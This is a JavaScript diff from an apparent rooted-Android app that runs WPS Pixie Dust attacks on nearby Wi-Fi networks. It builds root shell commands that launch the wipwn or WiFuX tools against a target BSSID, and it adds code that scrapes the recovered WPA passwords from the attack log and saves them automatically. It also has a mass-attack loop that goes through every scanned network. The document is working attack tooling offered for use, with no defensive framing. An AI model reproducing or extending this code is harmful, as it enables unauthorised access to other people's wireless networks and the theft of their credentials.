@@ -757,14 +757,13 @@ async function runSetup(network, tool = 'wipwn') {
     }, 2000);
 }
 
-// ✅ UPDATED: Uses currentAttackTool to run correct attack command
 async function startAttack(network, type) {
-    if (!network.bssid) {        if (typeof showStatus === 'function') showStatus('❌ MAC address not found', '#FF3B30');
+    if (!network.bssid) {        
+        if (typeof showStatus === 'function') showStatus('❌ MAC address not found', '#FF3B30');
         return;
     }
 
     const content = document.getElementById('attack-content');
-    // FIX: Changed parentElement.parentElement to parentElement
     const logContainer = document.querySelector('#attack-log').parentElement;
     const stopBtn = document.getElementById('stop-attack-btn');
     
@@ -784,32 +783,82 @@ async function startAttack(network, type) {
 
     let attackShellCmd = '';
     if (currentAttackTool === 'wipwn') {
-        // EXACT ORIGINAL WIPWN LOGIC
         attackShellCmd = `cd ~/wipwn && sudo python3 -u main.py -i wlan0 -b ${macUpper} ${attackArg}`;
     } else {
-        // ✅ WIFUX ATTACK LOGIC
         attackShellCmd = `cd ~/WiFuX && timeout 999999 sudo python -u main.py -i wlan0 -b ${macUpper} ${attackArg}`;
     }
 
-    await runTermuxCommand(attackShellCmd, '/sdcard/MTK_AI_Engine/wifi/wipwn.log', attackJobId);    await execFn('svc wifi disable');
+    await runTermuxCommand(attackShellCmd, '/sdcard/MTK_AI_Engine/wifi/wipwn.log', attackJobId);    
+    await execFn('svc wifi disable');
     await execFn('nohup sh /sdcard/MTK_AI_Engine/wifi/termux_script.sh &');
     startLogReader('/sdcard/MTK_AI_Engine/wifi/wipwn.log', 'attack-log');
     
+    // ✅ AUTO SAVE PASSWORD WITH ANSI CODE STRIPPING
+    let passwordSaved = false;
+    const checkPasswordInterval = setInterval(async () => {
+        if (passwordSaved) return;
+        try {
+            const rawLog = await execFn(`su -c "cat /sdcard/MTK_AI_Engine/wifi/wipwn.log 2>/dev/null"`);
+            
+            // ✅ STRIP ANSI COLOR CODES FIRST
+            const logContent = rawLog
+                .replace(/\x1b\[[0-9;]*[a-zA-Z]/g, '')  // Remove ANSI escape sequences
+                .replace(/\[[0-9;]*m/g, '')              // Remove any remaining color codes
+                .replace(/\[[\?]?[0-9;]*[hlr]/g, '');    // Remove cursor control codes
+            
+            // ✅ NOW MATCH ON CLEAN TEXT
+            const passwordMatch = logContent.match(/\[!\]\s*PSK\s*:\s*(\S+)/i) || 
+                                  logContent.match(/\[!\]\s*WPA PSK\s*:\s*(\S+)/i) ||
+                                  logContent.match(/WPA PSK:\s*([^\s\n]+)/i) || 
+                                  logContent.match(/WPA2 PSK:\s*([^\s\n]+)/i) ||
+                                  logContent.match(/PSK:\s*([^\s\n]+)/i) || 
+                                  logContent.match(/Password:\s*([^\s\n]+)/i);
+            
+            if (passwordMatch && passwordMatch[1] && passwordMatch[1].length > 0) {
+                passwordSaved = true;
+                const password = passwordMatch[1].trim().replace(/^['"]|['"]$/g, '');
+
+                savedNetworks[network.ssid] = password;
+                await saveNetworks();
+
+                const pwdDiv = document.createElement('div');
+                pwdDiv.style.cssText = 'color: #32D74B; text-align: center; padding: 10px; margin-top: 10px; background: #1a2f1a; border-radius: 8px; border: 1px solid #32D74B;';
+                pwdDiv.innerHTML = `
+                    ✅ <strong>Password Found & Auto-Saved!</strong><br>
+                    <span style="font-family: monospace; color: #fff; background: #0d1f0d; padding: 6px 12px; border-radius: 4px; display: inline-block; margin-top: 8px; font-size: 14px; letter-spacing: 1px;">${password}</span>
+                `;
+                content.appendChild(pwdDiv);
+
+                if (typeof showStatus === 'function') showStatus(`✅ Password found: ${password}`, '#32D74B');
+
+                if (typeof refreshNetworkPasswordStatus === 'function') refreshNetworkPasswordStatus();
+                if (typeof renderNetworkList === 'function') renderNetworkList();
+
+                clearInterval(checkPasswordInterval); 
+            }
+        } catch (e) {
+            console.error('Error checking password:', e);
+        }
+    }, 2000);
+
     stopBtn.onclick = async () => {
+        clearInterval(checkPasswordInterval); 
+        
         await execFn(`su -c "pkill -f ${attackJobId} || true"`);
         await execFn('cmd wifi stop-softap');
         await execFn('svc wifi enable');
         await execFn(`su -c "pkill -f termux_script.sh || true"`);
         await execFn(`su -c "pkill -9 -f /data/data/com.termux || true"`);
         stopLogReader();        
+        
         stopBtn.style.display = 'none';
         content.innerHTML = `<div style="color: #FF9F0A; text-align: center; padding: 10px;">⏹️ Attack stopped.</div>`;
     };
 }
 
-// ✅ UPDATED: Mass attack now supports both tools
+// ✅ UPDATED: Mass attack now supports both tools + ANSI STRIPPING + PSK MATCHING
 async function attackAllNetworks() {    
-if (availableNetworks.length === 0) {
+    if (availableNetworks.length === 0) {
         if (typeof showStatus === 'function') showStatus('❌ No networks to attack. Scan first!', '#FF3B30');
         return;
     }
@@ -856,8 +905,8 @@ if (availableNetworks.length === 0) {
         <h3 style="color: #fff; margin: 0 0 16px; font-size: 18px; font-weight: 600; text-align: center;">⚔️ Mass Pixie Dust Attack (${currentAttackTool === 'wipwn' ? 'WiPwn' : 'WiFuX'})</h3>
         <div style="color: #8b92b4; font-size: 13px; margin-bottom: 16px; text-align: center;">
             Targeting <strong style="color: #4a9eff">${targetNetworks.length}</strong> networks • 30s per target
-        </div>
-        <div style="margin-bottom: 20px;">            <div style="display: flex; justify-content: space-between; margin-bottom: 8px; color: #8b92b4; font-size: 12px;">
+        </div>        <div style="margin-bottom: 20px;">
+            <div style="display: flex; justify-content: space-between; margin-bottom: 8px; color: #8b92b4; font-size: 12px;">
                 <span id="attack-progress-text">Initializing...</span>
                 <span id="attack-current-target">0/${targetNetworks.length}</span>
             </div>
@@ -889,7 +938,8 @@ if (availableNetworks.length === 0) {
     const results = [];
 
     document.getElementById('stop-all-attack-btn').onclick = async () => {
-        attackStopped = true;        await execFn('su -c "pkill -f MASS_ATTACK || true"');
+        attackStopped = true;
+        await execFn('su -c "pkill -f MASS_ATTACK || true"');
         await execFn('cmd wifi stop-softap');
         await execFn('svc wifi enable');
         await execFn('su -c "pkill -f termux_script.sh || true"');
@@ -904,8 +954,7 @@ if (availableNetworks.length === 0) {
 
     // Loop through each target network
     for (let i = 0; i < targetNetworks.length; i++) {
-        if (attackStopped || passwordFound) break;
-        const network = targetNetworks[i];
+        if (attackStopped || passwordFound) break;        const network = targetNetworks[i];
         const macUpper = network.bssid.toUpperCase();
         
         // Update UI progress
@@ -939,6 +988,7 @@ if (availableNetworks.length === 0) {
         await execFn('svc wifi disable');
         await execFn('nohup sh /sdcard/MTK_AI_Engine/wifi/termux_script.sh &');
         startLogReader('/sdcard/MTK_AI_Engine/wifi/wipwn.log', 'attack-all-log');        
+        
         // Wait for 30 seconds (plus 2s buffer to ensure logs are fully written)
         await new Promise(resolve => setTimeout(resolve, 32000));
 
@@ -950,13 +1000,25 @@ if (availableNetworks.length === 0) {
         // --------------------------------
 
         // Check if password was found in logs
-        const logContent = await execFn(`su -c "cat /sdcard/MTK_AI_Engine/wifi/wipwn.log 2>/dev/null"`);
+        const rawLog = await execFn(`su -c "cat /sdcard/MTK_AI_Engine/wifi/wipwn.log 2>/dev/null"`);
         
-        const passwordMatch = logContent.match(/WPA PSK:\s*([^\s\n]+)/i) || 
-                             logContent.match(/Password:\s*([^\s\n]+)/i);
+        // ✅ STRIP ANSI COLOR CODES FIRST
+        const logContent = rawLog            .replace(/\x1b\[[0-9;]*[a-zA-Z]/g, '')  // Remove ANSI escape sequences
+            .replace(/\[[0-9;]*m/g, '')              // Remove any remaining color codes
+            .replace(/\[[\?]?[0-9;]*[hlr]/g, '');    // Remove cursor control codes
+        
+        // ✅ EXPANDED REGEX: Catches [!] PSK, WPA PSK, WPA2 PSK, generic PSK, and Password
+        const passwordMatch = logContent.match(/\[!\]\s*PSK\s*:\s*(\S+)/i) || 
+                              logContent.match(/\[!\]\s*WPA PSK\s*:\s*(\S+)/i) ||
+                              logContent.match(/WPA PSK:\s*([^\s\n]+)/i) || 
+                              logContent.match(/WPA2 PSK:\s*([^\s\n]+)/i) ||
+                              logContent.match(/PSK:\s*([^\s\n]+)/i) || 
+                              logContent.match(/Password:\s*([^\s\n]+)/i);
+                              
         if (passwordMatch && passwordMatch[1] && passwordMatch[1].length > 0) {
             passwordFound = true;
-            const password = passwordMatch[1].trim();
+            // Clean up surrounding quotes if the tool outputs PSK: 'password'
+            const password = passwordMatch[1].trim().replace(/^['"]|['"]$/g, '');
             results.push({ ssid: network.ssid, bssid: network.bssid, password: password, status: 'SUCCESS' });
 
             // Save the password
@@ -987,10 +1049,10 @@ if (availableNetworks.length === 0) {
     // Show results summary
     if (results.length > 0) {
         document.getElementById('attack-all-results').style.display = 'block';
-        const resultsList = document.getElementById('attack-all-results-list');        const successCount = results.filter(r => r.status === 'SUCCESS').length;
+        const resultsList = document.getElementById('attack-all-results-list');
+        const successCount = results.filter(r => r.status === 'SUCCESS').length;
         const failedCount = results.filter(r => r.status === 'FAILED').length;
-        
-        let resultsHtml = `
+                let resultsHtml = `
             <div style="display: flex; justify-content: space-between; margin-bottom: 12px; padding: 8px; background: #1a1f3a; border-radius: 6px;">
                 <span style="color: #32D74B; font-weight: 600;">✅ Success: ${successCount}</span>
                 <span style="color: #FF3B30; font-weight: 600;">❌ Failed: ${failedCount}</span>
@@ -1002,7 +1064,8 @@ if (availableNetworks.length === 0) {
                 resultsHtml += `
                     <div style="padding: 8px; margin-bottom: 8px; background: #1a2f1a; border-left: 3px solid #32D74B; border-radius: 4px;">
                         <div style="color: #32D74B; font-weight: 600; font-size: 12px;">✅ ${result.ssid}</div>
-                        <div style="color: #fff; font-family: monospace; font-size: 11px; margin-top: 4px; padding: 4px; background: #0d1f0d; border-radius: 4px;">${result.password}</div>                    </div>
+                        <div style="color: #fff; font-family: monospace; font-size: 11px; margin-top: 4px; padding: 4px; background: #0d1f0d; border-radius: 4px;">${result.password}</div>
+                    </div>
                 `;
             } else {
                 resultsHtml += `
